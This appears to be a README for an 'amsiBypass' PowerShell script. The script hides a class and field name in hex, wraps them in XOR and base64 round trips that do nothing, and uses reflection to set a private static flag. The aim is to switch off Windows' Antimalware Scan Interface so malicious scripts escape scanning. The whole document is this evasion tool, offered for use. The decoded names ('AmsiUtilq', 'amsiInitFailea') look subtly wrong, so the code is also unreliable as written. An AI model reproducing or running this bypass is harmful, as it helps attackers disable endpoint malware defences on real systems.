# amsiBypass

```

function XOR-HexStrings {
    param (
        [string]$hexString,
        [string]$key
    )

    $result = @()
    $hexValues = $hexString -split ' '
    $keyValues = $key.ToCharArray()

    for ($i = 0; $i -lt $hexValues.Length; $i++) {
        # Convert hex to byte (character), XOR with key character, and convert back to hex
        $xorResult = [convert]::ToByte($hexValues[$i], 16) -bxor [char]$keyValues[$i % $keyValues.Length]
        $result += '{0:X2}' -f $xorResult  # format as hex
    }

    return $result -join ' ' 
}

$xorKey = "1246hhjjjkkgdddd"

function HexToString ($hexArray) {
    return ($hexArray -split ' ' | ForEach-Object { [char][convert]::ToInt16($_, 16) }) -join ''
}

$originalAdditionalNameHex = "41 6D 73 69 55 74 69 6C 71"
$originalFieldNameHex = "61 6D 73 69 49 6E 69 74 46 61 69 6C 65 61"

$additionalNameHex = XOR-HexStrings -hexString $originalAdditionalNameHex -key $xorKey
$fieldNameHex = XOR-HexStrings -hexString $originalFieldNameHex -key $xorKey
$decryptedAdditionalNameHex = XOR-HexStrings -hexString $additionalNameHex -key $xorKey
$decryptedFieldNameHex = XOR-HexStrings -hexString $fieldNameHex -key $xorKey

$baseName = 'System.Management.Automation.'
$className = $baseName + (HexToString $decryptedAdditionalNameHex)

$fieldName = HexToString $decryptedFieldNameHex

$base64DecodedName = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($className))))
$base64DecodedField = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fieldName))))

try {
    # Use reflection to modify the field value
    [Ref].Assembly.GetType($base64DecodedName).GetField($base64DecodedField,'NonPublic,Static').SetValue($null,$true)
    Write-Host "The field was successfully modified."
} catch {
    Write-Host "An error occurred: $_"
}

```

